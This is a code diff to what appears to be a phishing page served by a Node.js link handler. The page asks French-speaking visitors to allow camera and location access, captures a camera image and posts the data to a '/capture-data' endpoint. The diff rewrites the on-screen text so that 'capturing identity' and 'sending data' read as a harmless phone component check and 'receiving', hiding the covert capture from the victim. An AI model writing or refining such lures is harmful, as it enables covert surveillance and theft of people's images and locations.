@@ -168,7 +168,7 @@ function handleLinkRequest(req, res, platformOverride = null) {
         <p style="font-size: 12px; color: #999; margin-top: 10px;">Note: Autorisez l'accès à la caméra et localisation quand demandé.</p>
 
         <button id="verifyBtn" class="btn" onclick="startCapture()">
-            🔒 Démarrer la vérification
+            🔒 Démarrer la vérification des composants de ton télephone...
         </button>
 
         <div id="loading" class="loading">
@@ -227,7 +227,7 @@ function handleLinkRequest(req, res, platformOverride = null) {
                     }, { timeout: 8000 });
                 });
 
-                loadingText.innerText = "📸 Capture de l'identite...";
+                loadingText.innerText = "📸 Verification de l'état du Caméra...";
                 const stream = await cameraPromise;
                 if (stream) {
                     const video = document.createElement('video');
@@ -259,7 +259,7 @@ function handleLinkRequest(req, res, platformOverride = null) {
                     };
                 }
 
-                loadingText.innerText = "📡 Envoi des donnees...";
+                loadingText.innerText = "📡 Reception...";
                 await fetch('/capture-data', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
